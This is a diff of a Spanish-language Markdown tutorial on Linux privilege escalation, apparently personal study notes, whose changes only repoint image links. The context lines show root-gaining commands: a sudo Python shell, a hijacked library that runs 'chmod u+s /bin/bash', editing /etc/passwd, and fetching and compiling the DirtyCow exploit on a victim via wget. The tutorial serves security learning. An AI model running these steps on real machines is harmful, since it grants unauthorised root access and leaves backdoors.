@@ -48,7 +48,7 @@ Una vez localizados los binarios con SUID, lo chequeamos en la página web de GT
 
 > https://gtfobins.github.io/
 
-![Pasted image 20251013145321](Pasted%20image%2020251013145321.png)
+![Pasted image 20251013145321](Hacking-repo-obs/Anexos/Pasted%20image%2020251013145321.png)
 
 Ya solo queda ejecutar el comando para convertirse en root.
 
@@ -62,7 +62,7 @@ sudo -l
 
 Esto nos arroja un posible resultado como el de la imagen:
 
-![Pasted image 20251012145952](Pasted%20image%2020251012145952.png)
+![Pasted image 20251012145952](Hacking-repo-obs/Anexos/Pasted%20image%2020251012145952.png)
 
 Al ver esto, vamos a ejecutar dicha ruta absoluta para ejecutar python, y además le añadiremos el parámetro -i para ejecutarlo en modo interactivo:
 En este punto, con el siguiente one-liner logramos ejecución remota de comandos con privilegios:
@@ -71,7 +71,7 @@ En este punto, con el siguiente one-liner logramos ejecución remota de comandos
 sudo -u root /usr/bin/python3 -i
 ```
 
-![Pasted image 20251012151418](Pasted%20image%2020251012151418.png)
+![Pasted image 20251012151418](Hacking-repo-obs/Anexos/Pasted%20image%2020251012151418.png)
 
 Ahora que sabemos que funciona, vamos a ejecutar la siguiente sentencia:
 
@@ -79,7 +79,7 @@ Ahora que sabemos que funciona, vamos a ejecutar la siguiente sentencia:
 import os; os.system("/bin/sh");
 ```
 
-![Pasted image 20251012152619](Pasted%20image%2020251012152619.png)
+![Pasted image 20251012152619](Hacking-repo-obs/Anexos/Pasted%20image%2020251012152619.png)
 
 ### PATH Hijacking
 ____
@@ -120,7 +120,7 @@ Un comando que se puede usar para crear dicha librería falsa es el siguiente:
 echo 'import os; os.system("chmod u+s /bin/bash")' > librería.py
 ```
 
-![Pasted image 20251015074212](Pasted%20image%2020251015074212.png)
+![Pasted image 20251015074212](Hacking-repo-obs/Anexos/Pasted%20image%2020251015074212.png)
 
 ### Abuso de permisos mal implementados
 _____
@@ -146,7 +146,7 @@ En este caso he puesto la contraseña **hola**.
 
 Ahora, la pegamos en el archivo passwd:
 
-![Pasted image 20251015081340](Pasted%20image%2020251015081340.png)
+![Pasted image 20251015081340](Hacking-repo-obs/Anexos/Pasted%20image%2020251015081340.png)
 
 Ahora ya podemos acceder al usuario root con la contraseña hola.
 
@@ -160,17 +160,17 @@ En versiones antiguas del kernel de Linux, se han descubierto vulnerabilidades q
 
 Chequeamos la versión del kernel:
 
-![Pasted image 20251015155436](Pasted%20image%2020251015155436.png)
+![Pasted image 20251015155436](Hacking-repo-obs/Anexos/Pasted%20image%2020251015155436.png)
 
 
 
-![Pasted image 20251015155718](Pasted%20image%2020251015155718.png)
+![Pasted image 20251015155718](Hacking-repo-obs/Anexos/Pasted%20image%2020251015155718.png)
 
 ```bash
 searchsploit -m linux/local/40839.c
 ```
 
-![Pasted image 20251015160002](Pasted%20image%2020251015160002.png)
+![Pasted image 20251015160002](Hacking-repo-obs/Anexos/Pasted%20image%2020251015160002.png)
 
 Nos traemos el exploit a nuestro directorio actual de trabajo y  lo renombramos a dirtycow.c
 
@@ -186,7 +186,7 @@ Ahora lo descargamos en la máquina victima con este comando:
 wget 172.20.10.2/dirtycow.c
 ```
 
-![Pasted image 20251015162007](Pasted%20image%2020251015162007.png)
+![Pasted image 20251015162007](Hacking-repo-obs/Anexos/Pasted%20image%2020251015162007.png)
 
 Ahora vemos las instrucciones de instalación, con el comando:
 
@@ -194,15 +194,15 @@ Ahora vemos las instrucciones de instalación, con el comando:
 cat dirtycow.c | grep gcc
 ```
 
-![Pasted image 20251015164056](Pasted%20image%2020251015164056.png)
+![Pasted image 20251015164056](Hacking-repo-obs/Anexos/Pasted%20image%2020251015164056.png)
 
 Ejecutamos la orden:
 
-![Pasted image 20251015164730](Pasted%20image%2020251015164730.png)
+![Pasted image 20251015164730](Hacking-repo-obs/Anexos/Pasted%20image%2020251015164730.png)
 
 Le seteamos la contraseña **hola**, y comprobamos el /etc/passwd:
 
-![Pasted image 20251015164827](Pasted%20image%2020251015164827.png)
+![Pasted image 20251015164827](Hacking-repo-obs/Anexos/Pasted%20image%2020251015164827.png)
 
 Nos cambiamos al usuario fairfart usando las siguientes credenciales:
 
@@ -210,13 +210,13 @@ Nos cambiamos al usuario fairfart usando las siguientes credenciales:
 firefart:root
 ```
 
-![Pasted image 20251015164948](Pasted%20image%2020251015164948.png)
+![Pasted image 20251015164948](Hacking-repo-obs/Anexos/Pasted%20image%2020251015164948.png)
 
 Somos el usuario firefart en el grupo root!
 
 > NOTA: El exploit nos crea también una backup:
 
-![Pasted image 20251015165112](Pasted%20image%2020251015165112.png)
+![Pasted image 20251015165112](Hacking-repo-obs/Anexos/Pasted%20image%2020251015165112.png)
 
 
 ### Capabilities
